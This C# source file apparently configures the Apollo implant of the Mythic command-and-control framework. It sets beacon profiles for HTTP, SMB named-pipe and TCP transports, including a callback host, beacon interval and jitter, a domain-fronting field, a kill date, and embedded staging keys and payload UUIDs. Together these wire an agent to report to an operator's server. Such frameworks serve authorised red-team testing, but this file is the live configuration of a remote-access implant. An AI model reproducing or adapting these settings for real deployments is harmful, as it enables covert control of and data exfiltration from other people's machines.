#define SMB


using HttpTransport;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using PSKCryptography;
using ApolloInterop.Serializers;
using NamedPipeTransport;
using TcpTransport;

namespace Apollo
{
    public static class Config
    {
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://mythic" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" }
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "pipename", "wfah5hhe-4gqy-04ac-qbrg-d64jxa9fc6f1" },
                        { "encrypted_exchange_check", "T" },
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "port", "40000" },
                        { "encrypted_exchange_check", "T" },
                    }
                }
            }
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if HTTP
        public static string StagingRSAPrivateKey = "8GnFo5hkJHnK2+ZXmLs+mg+NF67bOlRyWrfrXWZG3Vg=";
#elif SMB
        public static string StagingRSAPrivateKey = "DSABvPysGIeBSSmz6y2FYrJGWb3kNLT0s2XSrTopA3Q=";
#elif TCP
        public static string StagingRSAPrivateKey = "ea7PWJKuszQ5CtdnNnYc1cCimbV0ue8X9bPB88kIHX4=";
#endif
#if HTTP
        public static string PayloadUUID = "11be0fb4-a6e7-4a11-ba38-fccadb28fd50";
#elif SMB
        public static string PayloadUUID = "712b89a3-2f36-4909-af83-06bbffdb3e1e";
#elif TCP
        public static string PayloadUUID = "1b899f62-6f58-4367-87f4-f92ae97db803";
#endif
    }
}
